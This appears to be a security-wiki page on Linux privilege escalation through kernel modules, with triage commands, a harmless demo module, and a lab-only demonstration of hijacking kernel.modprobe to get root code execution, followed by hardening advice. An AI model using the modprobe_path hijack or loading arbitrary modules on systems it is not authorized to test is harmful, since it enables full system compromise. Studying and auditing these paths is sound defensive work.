# Kernel Modules and modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module and module-loading misconfigurations

Kernel module support is a high-impact area during Linux privilege escalation review. Do not treat every unsigned-module message as exploitable by itself, but use it to answer practical questions:

- Can the current user load modules through `sudo`, capabilities, or a writable helper path?
- Is module loading still enabled?
- Is module signature enforcement disabled?
- Are module directories or module files writable?
- Can kernel logs be read to confirm what happened?

Quick triage:

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretation:

- `modules_disabled=1` means new modules cannot be loaded until reboot.
- `module_sig_enforce=1` usually blocks unsigned modules.
- `dmesg_restrict=0` lets unprivileged users read kernel logs on many systems.
- Writable paths under `/lib/modules/$(uname -r)/` are dangerous because module discovery and auto-loading can trust that tree.

### Loading a module and reading kernel output

If you have legitimate permission to load a local module, `insmod` inserts the exact `.ko` file you provide. The module's init function runs immediately, and messages written with `printk()` appear in kernel logs.

Minimal workflow for review or lab environments:

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

If `sudo -l` allows `insmod`, `modprobe`, or a wrapper around them, treat it as critical:

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo-allowed `insmod`

A sudo rule that allows a user to run `insmod` is not comparable to allowing a normal administrative helper. The module's initialization code runs in kernel context as soon as the `.ko` is inserted, so the practical review question is: "can this user choose or modify the module being loaded?"

Generic review flow:

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

If the user can provide an arbitrary `.ko`, the rule should be treated as full system compromise in an authorized assessment. A safer operational pattern is to avoid delegating module loading through sudo; if it is unavoidable, restrict the exact path, ownership, permissions, signing policy, and removal workflow.

For a harmless module-building pattern in a controlled lab, a minimal source and Makefile look like:

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Build and load only in an authorized lab:

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` controls the userspace helper the kernel invokes when it needs module-loading assistance. If an attacker can change it to a writable executable path and trigger an unknown binary format or another module request path, it can become root code execution.

Check the current helper:

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Check whether you can influence it:

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Generic lab-only pattern:

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

On hardened systems, this should fail because unprivileged users cannot write `kernel.modprobe`, the helper path is not writable, or module-loading paths are blocked.

### Writable `/lib/modules` review

Writable module directories can allow module replacement, malicious module planting, or auto-load abuse depending on how `modprobe` is later invoked.

Review writable locations:

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

If you find writable module content, check how modules are discovered:

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Defensive notes:

- Keep `/lib/modules` owned by `root:root` and non-writable by users.
- Set `kernel.modules_disabled=1` after boot where operationally possible.
- Enforce module signing on systems that require loadable modules.
- Monitor writes to `/proc/sys/kernel/modprobe`, `/lib/modules`, and unexpected `insmod`/`modprobe` execution.
{{#include ../../banners/hacktricks-training.md}}
